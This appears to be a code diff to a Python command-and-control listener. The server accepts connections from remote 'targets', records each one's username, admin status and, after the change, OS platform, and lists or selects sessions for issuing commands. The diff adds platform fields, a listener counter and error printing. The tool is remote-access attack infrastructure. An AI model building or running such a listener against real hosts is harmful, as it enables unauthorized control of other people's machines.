@@ -40,7 +40,11 @@ def message_handler():
         try:
             remote_target, remote_ip = sock.accept()
             username = remote_target.recv(1024).decode()
+            print('username received - ', username)
             admin = remote_target.recv(1024).decode()
+            print('admin value received - ', admin)
+            platform = remote_target.recv(1024).decode()
+            print('platform value received - ', platform)
             if admin == '1':
                 isAdmin = 'Yes'
             elif username == 'root':
@@ -54,12 +58,12 @@ def message_handler():
             host_name = socket.gethostbyaddr(remote_ip[0])
             if host_name is not None:
                 sessions.append(
-                    [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_stamp, username, isAdmin])
+                    [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_stamp, username, isAdmin, platform])
                 print(
                     f'\n[*] Connection received from {host_name[0]}@{remote_ip[0]} \nEnter command#> ', end='')
             else:
                 sessions.append(
-                    [remote_target, remote_ip[0], time_stamp, username])
+                    [remote_target, remote_ip[0], time_stamp, username, isAdmin, platform])
                 print(
                     f'\n[*] Connection received from {remote_ip[0]} \nEnter command#> ', end='')
         except:
@@ -91,6 +95,7 @@ if __name__ == '__main__':
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     banner()
     sessions = []
+    listener_counter = 0
     exit_flag = False
     while True:
         try:
@@ -99,16 +104,17 @@ if __name__ == '__main__':
                 host_ip = input('[*] Enter LHOST IP: ')
                 host_port = input('[*] Enter LPORT to listen on: ')
                 listener_handler()
+                listener_counter += 1
             if command.split(' ')[0] == 'sessions':
                 session_counter = 1
                 if command.split(' ')[1] == '-l':
                     table = PrettyTable()
                     table.field_names = ['Session', 'Status', 'Username', 'Admin',
-                                         'Target', 'Connection Time']
+                                         'Target', 'OS Platform', 'Connection Time']
                     table.padding_width = 2
                     for target in sessions:
                         table.add_row(
-                            [session_counter, 'Placeholder', target[3], target[4], target[1], target[2]])
+                            [session_counter, 'Placeholder', target[3], target[4], target[1], target[5], target[2]])
                         session_counter += 1
                     print(table)
                 if command.split(' ')[1] == '-i':
@@ -125,3 +131,5 @@ if __name__ == '__main__':
             exit_flag = True
             sock.close()
             break
+        except Exception as e:
+            print(e)
